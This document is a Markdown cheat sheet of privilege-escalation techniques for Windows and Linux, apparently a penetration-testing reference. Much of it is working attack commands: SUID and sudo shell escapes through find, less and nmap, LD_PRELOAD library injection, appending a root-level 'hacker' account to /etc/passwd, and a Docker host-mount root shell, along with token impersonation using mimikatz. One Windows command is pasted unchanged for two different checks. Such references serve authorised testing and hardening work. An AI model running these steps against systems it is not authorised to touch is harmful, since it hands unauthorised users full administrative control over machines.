# Privilege Escalation Cheat Sheets 🔓

### Purpose
These cheat sheets serve as a guide to privilege escalation techniques on Windows and Linux systems. They provide an overview of common misconfigurations, exploitable conditions, and tools to aid in identifying and exploiting privilege escalation vectors.

---

## 📖 Table of Contents

1. [Windows Privilege Escalation Cheat Sheet](#windows-privilege-escalation-cheat-sheet)
2. [Linux Privilege Escalation Cheat Sheet](#linux-privilege-escalation-cheat-sheet)

---

## 1. Windows Privilege Escalation Cheat Sheet

### 🔍 Common Misconfigurations to Check For

1. **Writable Services**:
   - Check for services that run with high privileges but are writable by non-admin users.
   - **Command**:
     ```powershell
     wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
     ```

2. **Unquoted Service Paths**:
   - Unquoted paths in services can lead to privilege escalation if an executable is placed in the path.
   - **Command**:
     ```powershell
     wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
     ```

3. **Insecure File Permissions**:
   - Check for files and directories with insecure permissions, which may allow modification by lower-privileged users.
   - **Command**:
     ```powershell
     icacls "C:\path\to\file"  # Check specific file permissions
     ```

4. **Weak Registry Permissions**:
   - Some registry keys may be writable and lead to privilege escalation (e.g., setting autostart programs).
   - **Command**:
     ```powershell
     reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
     ```

5. **Scheduled Tasks**:
   - Scheduled tasks with weak permissions or writable executables can allow privilege escalation.
   - **Command**:
     ```powershell
     schtasks /query /fo LIST /v
     ```

### 💣 Exploit Techniques

1. **DLL Hijacking**:
   - If a privileged application loads a missing DLL from a directory where non-admin users have write access, a malicious DLL can be loaded instead.

2. **Token Impersonation**:
   - Some processes running with SYSTEM privileges may allow impersonation by lower-privileged users.
   - **Technique**:
     - Use tools like `Incognito` in Metasploit or `mimikatz` to list and impersonate available tokens.

3. **Service Exploitation**:
   - Misconfigured services (e.g., unquoted paths, writable binaries) can be exploited by replacing the service binary with a malicious payload.

4. **Insecure Registry Settings**:
   - Modify registry values such as `AlwaysInstallElevated` to allow elevation of low-privileged MSI files.

### 🛠 Tools for Finding Privilege Escalation Vectors

1. **WinPEAS**: Scans for common privilege escalation vectors on Windows.
   - **Usage**:
     ```powershell
     .\winPEASx64.exe
     ```

2. **PowerUp**: PowerShell script to find and exploit common privilege escalation weaknesses on Windows.
   - **Example Commands**:
     ```powershell
     Import-Module .\PowerUp.ps1
     Invoke-AllChecks
     ```

3. **Seatbelt**: Enumeration tool for Windows environments to identify potential attack vectors.
   - **Usage**:
     ```powershell
     .\Seatbelt.exe all
     ```

---

## 2. Linux Privilege Escalation Cheat Sheet

### 🔍 SUID Binaries to Exploit

- **List all SUID binaries**: Check for binaries with the SUID bit set, which may allow privilege escalation.
  ```bash
  find / -perm -4000 -type f 2>/dev/null
  ```

- **Common Exploitable SUID Binaries**:
  - **`/bin/bash`**: Some systems misconfigure bash as SUID, allowing root shell access.
  - **`find`**: If `find` has SUID permissions, it can be used to execute commands as root.
    ```bash
    find . -exec /bin/sh -p \; -quit
    ```
  - **`nmap`**: Older versions of `nmap` can provide an interactive shell when launched with the `--interactive` option.
  - **`vim`** or **`nano`**: Using `vim` as SUID can allow spawning a shell with root privileges.

### 🔒 Exploitable Sudo Misconfigurations

1. **Check Sudo Privileges**:
   - Use `sudo -l` to list the commands a user can execute with sudo.
   ```bash
   sudo -l
   ```

2. **Exploitable Sudo Commands**:
   - **Sudo without Password**: If a command can be run as sudo without a password, it can be used to escalate privileges.
   - **Sudo Environment Variables**: If `sudo` allows setting of environment variables, `LD_PRELOAD` can be used to inject malicious libraries.
     ```bash
     sudo LD_PRELOAD=/path/to/lib.so command
     ```
   - **Direct Root Access via `sudo`**: Some commands like `less`, `man`, and `vim` can be exploited to spawn a root shell.

3. **Specific Exploitable Binaries**:
   - **`sudo nmap`**:
     ```bash
     sudo nmap --interactive
     ```
   - **`sudo less`**: If `less` can be run with sudo, access a shell by using `!` within `less`.
     ```bash
     sudo less /etc/hosts
     # Press !sh in less to spawn a shell
     ```

### 🛠 Enumeration Tools

1. **LinPEAS**: Scans for privilege escalation vectors on Linux.
   - **Usage**:
     ```bash
     ./linpeas.sh
     ```

2. **linux-exploit-suggester**: Recommends kernel exploits based on system configuration.
   - **Usage**:
     ```bash
     ./linux-exploit-suggester.sh
     ```

3. **LinEnum**: Another enumeration script for privilege escalation on Linux.
   - **Usage**:
     ```bash
     ./LinEnum.sh -r report.txt
     ```

### 🎛 Common Exploitable Kernel and Software Configurations

1. **Kernel Exploits**:
   - Use tools like `linux-exploit-suggester` to identify vulnerable kernel versions for which public exploits are available.

2. **Writable `/etc/passwd` or `/etc/shadow`**:
   - If `/etc/passwd` is writable, a new user can be added with root privileges.
   - **Example**:
     ```bash
     echo "hacker:x:0:0:hacker:/root:/bin/bash" >> /etc/passwd
     su hacker
     ```

3. **NFS Root Squashing Disabled**:
   - If NFS exports are misconfigured (no_root_squash enabled), it can allow root access on the NFS client machine.

4. **Docker Privilege Escalation**:
   - If the user is part of the `docker` group, they can escalate privileges by mounting the host filesystem inside a container.
   ```bash
   docker run -v /:/mnt --rm -it alpine chroot /mnt sh
   ```

---

### 📘 Resources

- **GTFOBins**: [gtfobins.github.io](https://gtfobins.github.io/) - A collection of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.
- **PayloadsAllTheThings**: GitHub repository with extensive privilege escalation techniques for both Windows and Linux.
- **Windows-Exploit-Suggester**: Checks for missing patches in Windows systems that may allow privilege escalation.
